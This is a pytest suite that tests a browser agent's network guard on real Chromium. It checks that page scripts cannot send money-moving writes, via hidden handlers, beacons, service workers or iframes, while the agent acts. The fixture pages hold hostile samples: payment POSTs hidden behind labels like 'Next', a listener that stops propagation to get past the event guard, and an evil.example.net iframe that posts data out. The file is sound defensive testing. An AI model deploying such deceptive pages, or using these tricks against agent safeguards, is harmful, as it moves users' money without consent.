"""Owner decision 2026-09-30 (review I6 M4) — the network-effect guard, on real Chromium.

A page can move money in a JavaScript handler behind any label ("Next", "Go"); no check
before the click can see it. The owner chose: while the Harness acts, it intercepts the
page's network requests and blocks writes unless the task is admitted as mutating; a blocked
request goes to the owner.

Every case drives the real Harness worker HTTP handler (its fixed scripts, run with
browser-harness's helper surface over CDP — ``cdp_harness_kit``) against headless Chromium
1194 launched with the worker's guard flags, and pages served by a local HTTPS server. The
server's request log is the instrument: a write "escaped" when the server received it.
"""
from __future__ import annotations

import json
import pathlib
import tempfile
import threading
import time
from http.server import ThreadingHTTPServer

import pytest

import cdp_harness_kit as kit
import test_browser_api as t
from test_browser_api import _settings  # noqa: F401 - autouse: the API settings the routes need
import test_browser_interaction_router as tr
import test_harness_elements as he
from van_gateway.browser.adapters import (
    HarnessLeaseFence,
    HttpBrowserHarnessAdapter,
    harness_effect_mac,
    harness_lease_fence,
    harness_scope_digest,
)
from van_gateway.browser.interaction_router import (
    DeterministicAction,
    HarnessActionExecutor,
    HarnessTargetResolver,
    RouterAction,
    RouterLane,
    StepState,
)
from van_gateway.browser.task_scope import scope_for_new_task

pytestmark = pytest.mark.skipif(not kit.chromium_available(), reason="no Chromium for the network-effect guard")

DOMAIN = he.DOMAIN
KEY = b"k" * 32
PAY = "fetch('/api/pay',{method:'POST',body:'amount=500'})"
LOG = """<script>window.__van=[];document.addEventListener('click',e=>{const t=e.composedPath()[0];window.__van.push('click:'+(t.id||t.localName))},true)</script>"""

#: Fixture pages, all served inside /docs/ (the path scope of a path-scoped task).
PAGES = {
    # I5's words page: #w5 "Next" and #w8 "Go" are the labels no classifier flags (I6 M4).
    "/docs/words": "".join(f'<button id="w{i}">{w}</button><br>' for i, w in enumerate(
        ["Continue", "Complete", "Proceed", "Place", "Finish", "Next", "Place my 0rder now", "Complete trade", "Go", "Yes, charge me"]))
        + f"<script>document.querySelectorAll('button').forEach(b=>b.addEventListener('click',()=>{PAY}))</script>",
    "/docs/n_fetch": f'<button id="b" onclick="{PAY}">Next</button>',
    "/docs/beacon": "<button id=\"b\" onclick=\"navigator.sendBeacon('/api/pay','amount=500')\">Next</button>",
    "/docs/keepalive": "<button id=\"b\" onclick=\"fetch('/api/pay',{method:'POST',body:'x',keepalive:true})\">Next</button>",
    # requestSubmit of a pay form from a benign handler. The Harness's event guard cancels a
    # submit whose submitter is not the bound element, so this page first registers its own
    # window-capture listener that stops the event reaching that guard: the network guard is
    # what catches it.
    "/docs/request_submit": "<script>window.addEventListener('submit',e=>e.stopImmediatePropagation(),true)</script>"
                            '<form id="pf" method="post" action="/docs/pay"><input type="hidden" name="amt" value="500"></form>'
                            "<button id=\"b\" type=\"button\" onclick=\"document.getElementById('pf').requestSubmit()\">Read guide</button>",
    "/docs/request_submit_plain": '<form id="pf" method="post" action="/docs/pay"><input type="hidden" name="amt" value="500"></form>'
                                  "<button id=\"b\" type=\"button\" onclick=\"document.getElementById('pf').requestSubmit()\">Read guide</button>",
    "/docs/form_get": '<form id="pf" method="get" action="/docs/search"><input name="q" value="x"></form>'
                      "<button id=\"b\" type=\"button\" onclick=\"document.getElementById('pf').submit()\">Read guide</button>",
    "/docs/timeout": f'<button id="b" onclick="setTimeout(()=>{PAY},300)">Next</button>',
    "/docs/capture": f"<script>window.addEventListener('click',()=>{PAY},true)</script><button id=\"b\">Read guide</button>",
    "/docs/sync_xhr": "<button id=\"b\" onclick=\"try{const x=new XMLHttpRequest();x.open('POST','/api/pay',false);x.send('a')}catch(e){}\">Next</button>",
    "/docs/method": "<button id=\"b\" onclick=\"fetch('/api/pay',{method:'SECRETVALUE42'})\">Next</button>",
    "/docs/xframe": '<button id="b" onclick="document.getElementById(\'f\').contentWindow.postMessage(\'go\',\'*\')">Next</button>'
                    '<iframe id="f" src="https://evil.example.net/frame"></iframe>',
    "/docs/popup": "<button id=\"b\" onclick=\"window.open('/docs/popup_pay')\">Next</button>",
    "/docs/popup_pay": f"<script>{PAY}</script>",
    "/docs/eventsource": "<button id=\"b\" onclick=\"window.__es=new EventSource('/api/stream')\">Next</button>",
    "/docs/websocket": "<button id=\"b\" onclick=\"window.__ws=new WebSocket('wss://docs.example.com/api/ws')\">Next</button>",
    "/docs/sw": "<button id=\"b\" onclick=\"fetch('/docs/sw-trigger')\">Next</button>"
                "<script>navigator.serviceWorker.register('/docs/sw.js')</script>",
    "/docs/sw.js": ("text/javascript", "self.addEventListener('install',e=>self.skipWaiting());"
                    "self.addEventListener('activate',e=>e.waitUntil(clients.claim()));"
                    "self.addEventListener('fetch',e=>{if(e.request.url.includes('sw-trigger'))"
                    "e.respondWith(fetch('/api/pay',{method:'POST',body:'y'}).then(()=>new Response('ok')))});"),
    "/docs/get_only": "<button id=\"b\" onclick=\"fetch('/docs/data').then(r=>r.text()).then(t=>document.title='got')\">Next</button>",
    "/docs/link": '<a id="b" href="/docs/next">Read guide</a>',
    # A plain button whose handler submits its form (a submit-role control is A4 for the
    # classifier, so a mutating task's form submission is driven this way).
    "/docs/form_in_scope": '<form method="post" action="/docs/notes"><input name="q" value="x">'
                           '<button id="b" type="button" onclick="this.form.submit()">Add note</button></form>',
    "/docs/post_out_of_scope": "<button id=\"b\" onclick=\"fetch('https://evil.example.net/api/pay',{method:'POST',body:'x',mode:'no-cors'})\">Save note</button>",
    "/docs/onload_pay": f"<script>{PAY}</script><p>hello</p>",
}


def _pages(host: str, path: str):
    if host.startswith("evil"):
        if path == "/frame":
            return "<script>addEventListener('message',()=>fetch('https://evil.example.net/api/pay',{method:'POST',body:'z'}))</script>"
        return None
    if path == "/docs/redirect":
        return None
    page = PAGES.get(path)
    if isinstance(page, str):
        return f"<!doctype html><html><head><title>{path}</title></head><body>{LOG}{page}</body></html>"
    return page


def _task(*, mutating: bool = False, path_scope: bool = True):
    scope = scope_for_new_task(DOMAIN, [f"https://{DOMAIN}/docs/"] if path_scope else None)
    return he._task().model_copy(update={"scope": scope, "mutating": mutating})


@pytest.fixture
def g(monkeypatch, tmp_path):
    module = he._load(monkeypatch, tmp_path)
    rig = kit.Rig(_pages, module.NETWORK_GUARD_CHROMIUM_FLAGS, tmp_path)
    monkeypatch.setattr(module, "run_harness", rig.run_harness)
    server = ThreadingHTTPServer(("127.0.0.1", 0), module.Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{server.server_address[1]}"
    try:
        yield module, rig, HttpBrowserHarnessAdapter(None, base_url=base, enabled=True), base
    finally:
        server.shutdown()
        server.server_close()
        rig.close()


def _keyed(g, tmp_path):
    """The worker and the gateway share a fence key (production posture)."""
    module, rig, _h, base = g
    module.FENCE = module.LeaseFence(tmp_path / "fence-state", key=KEY)
    return HttpBrowserHarnessAdapter(None, base_url=base, enabled=True, fence_key=KEY)


def _lane_kwargs(lane: str, locator: str, op: str = "click", key: str | None = None):
    if lane == "deterministic":
        return {"deterministic_action": DeterministicAction(operation=op, locator=locator, value_ref=key),
                "semantic_fallback": tr.FakeStagehand(None), "jev_client": None}
    if lane == "stagehand":
        return {"semantic_fallback": tr.FakeStagehand(RouterAction(
            lane=RouterLane.STAGEHAND, operation="click", locator=locator, value_ref=None, action_class=None,
            semantic_action={"method": "click", "description": "Next"}, description="Next")), "jev_client": None}
    if lane == "jev":
        classifier = tr.FakeClassifier(tr.FakeEligibility(
            eligibility_class="PUBLIC_ELIGIBLE", jev_payload=tr._payload(),
            target_map={tr.T_SEARCH: {"locator": "#nothing"}, tr.T_LINK: {"locator": locator}, tr.T_PAY: {"locator": "#nothing"}}))
        return {"jev_client": tr.FakeJev(tr.proposes("click", tr.T_LINK)), "eligibility_classifier": classifier,
                "semantic_fallback": tr.FakeStagehand(None)}
    raise AssertionError(lane)


async def _route(g, path, *, lane="deterministic", locator="#b", task=None, harness=None, op="click", key=None):
    module, rig, default_harness, _base = g
    harness = harness or default_harness
    rig.session.goto(f"https://{DOMAIN}{path}")
    time.sleep(0.2)
    rig.session.drain_events()
    rig.server.log.clear()
    task = task or _task()
    kw = _lane_kwargs(lane, locator, op, key)
    router = tr.make_router(target_resolver=HarnessTargetResolver(harness), executor=HarnessActionExecutor(harness),
                            **{k: v for k, v in kw.items() if k in ("semantic_fallback", "jev_client", "eligibility_classifier")})
    step = tr.step(**{k: v for k, v in kw.items() if k == "deterministic_action"})
    step.task = task
    with harness_lease_fence(HarnessLeaseFence(task.profile_alias, task.task_id, 1)):
        result = await router.route(step)
    time.sleep(0.6)  # anything the page does late still reaches the instrument
    try:
        seen = rig.session.js("window.__van || []")
    except Exception:  # noqa: BLE001 - an error page has no log
        seen = None
    return result, rig.server.writes(), seen


def _blocked(result, kind):
    assert result.state is StepState.OWNER_TAKEOVER, (result.state, result.reasons)
    assert f"HARNESS_REFUSED:NETWORK_WRITE_BLOCKED:{kind}" in result.reasons, result.reasons


# ------------------------------------------------------------------ the I6 M4 cases


@pytest.mark.parametrize("lane", ["deterministic", "stagehand", "jev"])
@pytest.mark.parametrize("button", ["#w5", "#w8"])
async def test_handler_payment_behind_a_benign_label_is_blocked_in_every_lane(g, lane, button):
    result, writes, seen = await _route(g, "/docs/words", lane=lane, locator=button)
    _blocked(result, "POST")
    assert writes == []
    assert result.lane is RouterLane.OWNER_TAKEOVER and result.escalated


@pytest.mark.parametrize("path, kind", [
    ("/docs/n_fetch", "POST"),
    ("/docs/beacon", "BEACON"),
    ("/docs/keepalive", "POST"),
    ("/docs/request_submit", "FORM_SUBMIT"),
    ("/docs/form_get", "FORM_SUBMIT"),
    ("/docs/timeout", "POST"),
    ("/docs/capture", "POST"),
    ("/docs/sync_xhr", "POST"),
    ("/docs/xframe", "CROSS_ORIGIN_FRAME"),
    ("/docs/popup", "POPUP"),
    ("/docs/eventsource", "EVENTSOURCE"),
])
async def test_every_write_channel_is_blocked_and_goes_to_the_owner(g, path, kind):
    result, writes, _seen = await _route(g, path)
    _blocked(result, kind)
    assert writes == []


async def test_a_request_submit_the_event_guard_sees_is_cancelled_before_the_network(g):
    """Layering: without the page's stopImmediatePropagation, the event guard cancels the
    submit first (nothing reaches the network either way)."""
    result, writes, _seen = await _route(g, "/docs/request_submit_plain")
    assert result.state is StepState.OWNER_TAKEOVER
    assert "HARNESS_REFUSED:TARGET_MOVED_DURING_ACTUATION" in result.reasons, result.reasons
    assert writes == []


async def test_a_service_worker_write_does_not_escape(g):
    module, rig, _h, _b = g
    rig.session.goto(f"https://{DOMAIN}/docs/sw")
    for _ in range(40):  # the worker controls the page after a reload
        if rig.session.js("!!navigator.serviceWorker.controller"):
            break
        time.sleep(0.1)
        rig.session.goto(f"https://{DOMAIN}/docs/sw")
    assert rig.session.js("!!navigator.serviceWorker.controller")
    result, writes, _seen = await _route(g, "/docs/sw")
    _blocked(result, "POST")
    assert writes == []


async def test_a_custom_method_is_reported_in_the_closed_vocabulary_only(g):
    result, writes, _seen = await _route(g, "/docs/method")
    _blocked(result, "OTHER_METHOD")
    assert writes == [] and not any("SECRETVALUE42" in r for r in result.reasons)


async def test_a_websocket_open_is_detected_and_goes_to_the_owner(g):
    """Residual, stated: CDP Fetch cannot intercept a WebSocket handshake in this Chromium,
    so the open is detected (lane 4), not prevented."""
    result, writes, _seen = await _route(g, "/docs/websocket")
    _blocked(result, "WEBSOCKET")
    assert writes == []


# ------------------------------------------------------------------ what still runs


async def test_a_get_only_benign_click_still_runs(g):
    module, rig, _h, _b = g
    result, writes, seen = await _route(g, "/docs/get_only")
    assert result.state is StepState.VERIFIED_SUCCESS, result.reasons
    assert writes == [] and ("GET", DOMAIN, "/docs/data") in rig.server.log
    assert rig.session.js("document.title") == "got"


async def test_an_in_scope_link_still_navigates(g):
    module, rig, _h, _b = g
    result, writes, _seen = await _route(g, "/docs/link")
    assert result.state is StepState.VERIFIED_SUCCESS, result.reasons
    assert rig.session.js("location.pathname") == "/docs/next" and writes == []


# ------------------------------------------------------------------ admitted as mutating


async def test_a_mutating_task_may_submit_a_form_inside_its_scope(g, tmp_path):
    module, rig, _h, _b = g
    harness = _keyed(g, tmp_path)
    result, writes, _seen = await _route(g, "/docs/form_in_scope", task=_task(mutating=True), harness=harness)
    assert result.state is StepState.VERIFIED_SUCCESS, result.reasons
    assert writes == [("POST", DOMAIN, "/docs/notes")]


async def test_a_mutating_task_is_blocked_writing_outside_its_scope(g, tmp_path):
    harness = _keyed(g, tmp_path)
    result, writes, _seen = await _route(g, "/docs/post_out_of_scope", task=_task(mutating=True), harness=harness)
    _blocked(result, "OUT_OF_SCOPE_WRITE")
    assert writes == []


async def test_a_mutating_task_is_blocked_writing_to_its_own_origin_outside_the_path_scope(g, tmp_path):
    harness = _keyed(g, tmp_path)
    result, writes, _seen = await _route(g, "/docs/n_fetch", task=_task(mutating=True), harness=harness)
    _blocked(result, "OUT_OF_SCOPE_WRITE")  # /api/pay is outside /docs/
    assert writes == []


async def test_a_mutating_flag_without_the_fence_key_is_not_trusted(g):
    """No key on either side: the Harness cannot verify the flag, so the task is treated as
    non-mutating (fail closed) even though the envelope says mutating."""
    result, writes, _seen = await _route(g, "/docs/form_in_scope", task=_task(mutating=True))
    _blocked(result, "FORM_SUBMIT")
    assert writes == []


async def test_a_keyed_harness_refuses_a_forged_mutating_flag_or_widened_scope(g, tmp_path):
    import httpx

    module, rig, _h, base = g
    _keyed(g, tmp_path)
    rig.session.goto(f"https://{DOMAIN}/docs/form_in_scope")
    task = _task(mutating=False)
    scope = task.scope.to_wire()
    envelope = {"mode": "PRODUCTION_ACTUATOR", "allow_helper_authoring": False, "task_id": task.task_id,
                "profile_alias": task.profile_alias, "target_domain": DOMAIN, "lease_generation": 1,
                "lease_holder_id": task.task_id, "lease_mac": module.fence_mac(KEY, task.profile_alias, 1, task.task_id)}
    good = harness_effect_mac(KEY, task.profile_alias, 1, task.task_id, task.task_id, False, harness_scope_digest(scope))
    wide = {"entries": [{"origin": "https://docs.example.com", "path_prefix": None}, {"origin": "https://evil.example.net", "path_prefix": None}]}
    for body in ({"mutating": True, "effect_mac": good, "task_scope": scope},  # flag flipped after MACing
                 {"mutating": False, "effect_mac": good, "task_scope": wide},  # scope widened after MACing
                 {"mutating": True, "task_scope": scope}):                    # no MAC at all
        r = httpx.post(f"{base}/scroll", json={**envelope, **body, "request": {"y": 10}}, timeout=30)
        assert (r.status_code, r.json().get("error")) == (403, "NETWORK_EFFECT_MAC_INVALID")
    assert rig.server.writes() == []


# ------------------------------------------------------------------ fail closed


@pytest.mark.parametrize("method", ["Fetch.enable", "Target.autoAttachRelated", "Target.attachToBrowserTarget"])
async def test_interception_that_cannot_be_enabled_refuses_the_action(g, method):
    module, rig, _h, _b = g

    def boom(params):
        raise RuntimeError("interception unavailable")

    rig.session.fail[method] = boom
    result, writes, seen = await _route(g, "/docs/n_fetch")
    assert result.state is StepState.OWNER_TAKEOVER
    assert "HARNESS_REFUSED:NETWORK_GUARD_UNAVAILABLE" in result.reasons, result.reasons
    assert writes == [] and not any(s.startswith("click:") for s in seen or [])  # no input was dispatched


async def test_a_script_without_the_event_stream_refuses_the_action(g):
    """A runtime whose helpers cannot deliver events cannot guard: refused, nothing clicked."""
    module, rig, _h, _b = g
    real = rig.session.namespace

    rig.session.namespace = lambda: {k: v for k, v in real().items() if k != "drain_events"}
    result, writes, seen = await _route(g, "/docs/n_fetch")
    assert "HARNESS_REFUSED:NETWORK_GUARD_UNAVAILABLE" in result.reasons, result.reasons
    assert writes == [] and not any(s.startswith("click:") for s in seen or [])


# ------------------------------------------------------------------ navigate / scroll


async def test_navigate_is_guarded_too(g):
    module, rig, harness, _b = g
    rig.session.goto(f"https://{DOMAIN}/docs/link")
    rig.server.log.clear()
    task = _task()
    from van_gateway.browser.adapters import BrowserAdapterError

    with harness_lease_fence(HarnessLeaseFence(task.profile_alias, task.task_id, 1)):
        with pytest.raises(BrowserAdapterError) as exc:
            await harness.navigate(task, f"https://{DOMAIN}/docs/onload_pay")
    assert (exc.value.code, exc.value.detail) == ("BROWSER_HARNESS_REFUSED", "NETWORK_WRITE_BLOCKED:POST")
    time.sleep(0.5)
    assert rig.server.writes() == []
    with harness_lease_fence(HarnessLeaseFence(task.profile_alias, task.task_id, 1)):
        info = await harness.navigate(task, f"https://{DOMAIN}/docs/link")
    assert info["url"].endswith("/docs/link")


# ------------------------------------------------------------------ /assignments and /step


async def test_assignments_hand_a_blocked_write_to_the_owner(g):
    from van_gateway.browser.worker import HybridBrowserWorker

    module, rig, harness, _b = g
    rig.session.goto(f"https://{t.DOMAIN}/docs/words")
    rig.server.log.clear()
    ac, _api, store = await t._client(pathlib.Path(tempfile.mkdtemp()), worker=HybridBrowserWorker(harness, None),
                                      verifier=t._Verdict())
    async with ac:
        task = await t._make_task(ac, strategy="HARNESS", autonomy_tier="L1_HARNESS_DETERMINISTIC")
        r = await ac.post("/v1/browser/assignments", headers=t.HEADERS, json={
            "task_id": task["task_id"], "turn_id": "t1", "command_id": "cmd-owner-1", "goal": "read",
            "allowed_domains": [t.DOMAIN], "action_class_ceiling": "A2", "autonomy_tier": "L1_HARNESS_DETERMINISTIC",
            "plan": {"steps": [{"kind": "click", "domain": t.DOMAIN, "locator": "#w5", "instruction": "Next"}]},
            "postcondition": {"kind": "READ_BACK", "field": "title", "expected": "x"}})
        body = r.json()
        status = (await ac.get(f"/v1/browser/tasks/{task['task_id']}", headers=t.HEADERS)).json()["task"]
    assert (body["stop_reason"], body["detail"], body["needs_owner"]) == (
        "OWNER_TAKEOVER", "HARNESS_REFUSED:NETWORK_WRITE_BLOCKED:POST", True)
    assert status["status"] == "WAITING_FOR_OWNER"
    assert status["error_code"] == "OWNER_TAKEOVER:HARNESS_REFUSED:NETWORK_WRITE_BLOCKED:POST"
    assert rig.server.writes() == []


async def test_interaction_step_hands_a_blocked_write_to_the_owner_with_a_closed_code(g, tmp_path):
    module, rig, harness, _b = g
    rig.session.goto(f"https://{t.DOMAIN}/docs/words")
    rig.server.log.clear()
    from fastapi import FastAPI
    from httpx import ASGITransport, AsyncClient

    from conftest_automation import make_store
    from van_gateway.attention.engine import AttentionEngine
    from van_gateway.browser.api import BrowserApi
    from van_gateway.browser.interaction_router import RouterStepLedger, build_interaction_routes
    from van_gateway.config import get_settings
    from van_gateway.decisions.service import DecisionService

    store = await make_store(tmp_path)
    api = BrowserApi(store, get_settings(), worker=t._ScriptedWorker([]),
                     decisions=DecisionService(store, AttentionEngine(store)), verifier=t._Verdict())

    async def observe(task):
        return {"url": f"https://{t.DOMAIN}/docs/words"}

    router = tr.make_router(executor=HarnessActionExecutor(harness), target_resolver=HarnessTargetResolver(harness),
                            jev_client=None, semantic_fallback=tr.FakeStagehand(None), observer=observe,
                            ledger=RouterStepLedger(store))
    app = FastAPI()
    app.include_router(api.router)
    app.include_router(build_interaction_routes(api, router))
    ac = AsyncClient(transport=ASGITransport(app=app), base_url="http://test")
    async with ac:
        tid = (await t._make_task(ac))["task_id"]
        r = await ac.post("/v1/browser/interaction/step", headers=t.HEADERS, json={
            "task_id": tid, "action_class_ceiling": "A2",
            "deterministic_action": {"operation": "click", "locator": "#w5"},
            "postcondition": {"kind": "READ_BACK", "field": "title", "expected": "x"}})
        task = (await ac.get(f"/v1/browser/tasks/{tid}", headers=t.HEADERS)).json()["task"]
        again = await ac.post("/v1/browser/interaction/step", headers=t.HEADERS, json={
            "task_id": tid, "action_class_ceiling": "A2",
            "deterministic_action": {"operation": "click", "locator": "#w0"},
            "postcondition": {"kind": "READ_BACK", "field": "title", "expected": "x"}})
        ledger = await store.fetchall("SELECT evidence_json FROM browser_evidence WHERE task_id = ?", (tid,))
    step = r.json()
    assert step["state"] == "OWNER_TAKEOVER" and "HARNESS_REFUSED:NETWORK_WRITE_BLOCKED:POST" in step["reasons"]
    assert (task["status"], task["error_code"]) == ("WAITING_FOR_OWNER", "OWNER_TAKEOVER:NETWORK_WRITE_BLOCKED:POST")
    assert again.status_code == 409  # nothing more runs until the owner decides
    text = json.dumps([json.loads(row["evidence_json"]) for row in ledger])
    assert "NETWORK_WRITE_BLOCKED:POST" in text
    assert "/api/pay" not in text and "amount" not in text
    assert rig.server.writes() == []


# ------------------------------------------------------------------ task truth


async def test_the_mutating_flag_is_task_truth_and_defaults_to_non_mutating(tmp_path):
    ac, api, store = await t._client(tmp_path)
    async with ac:
        plain = await t._make_task(ac)
        await ac.post("/v1/browser/profiles", headers=t.HEADERS, json={"profile_alias": "authenticated_owner"})
        mut = await ac.post("/v1/browser/tasks", headers=t.HEADERS, json={
            "profile_alias": "authenticated_owner", "strategy": "HARNESS", "autonomy_tier": "L1_HARNESS_DETERMINISTIC",
            "action_class": "A2", "target_domain": "notebooklm.google.com", "goal": "add a note",
            "command_id": "cmd-owner-1", "mutating": True})
        refused = await ac.post("/v1/browser/tasks", headers=t.HEADERS, json={
            "profile_alias": "public_research", "strategy": "HARNESS", "autonomy_tier": "L1_HARNESS_DETERMINISTIC",
            "action_class": "A2", "target_domain": t.DOMAIN, "goal": "x", "command_id": "cmd-owner-1", "mutating": True})
    assert mut.status_code == 200, mut.text
    assert refused.status_code == 422  # policy decides admission: mutation forbidden on this profile
    assert (await api._load_task(plain["task_id"])).mutating is False
    assert (await api._load_task(mut.json()["task_id"])).mutating is True
    await store.execute("UPDATE browser_tasks SET mutating = 7 WHERE task_id = ?", (plain["task_id"],))
    assert (await api._load_task(plain["task_id"])).mutating is False  # only 1 admits


def test_the_gateway_and_harness_macs_agree():
    module = he._load(pytest.MonkeyPatch(), pathlib.Path(tempfile.mkdtemp()))
    scope = _task().scope.to_wire()
    assert module.scope_digest(scope) == harness_scope_digest(scope)
    for mutating in (True, False):
        assert module.effect_mac(KEY, "a", 3, "h", "t", mutating, module.scope_digest(scope)) == harness_effect_mac(
            KEY, "a", 3, "h", "t", mutating, harness_scope_digest(scope))
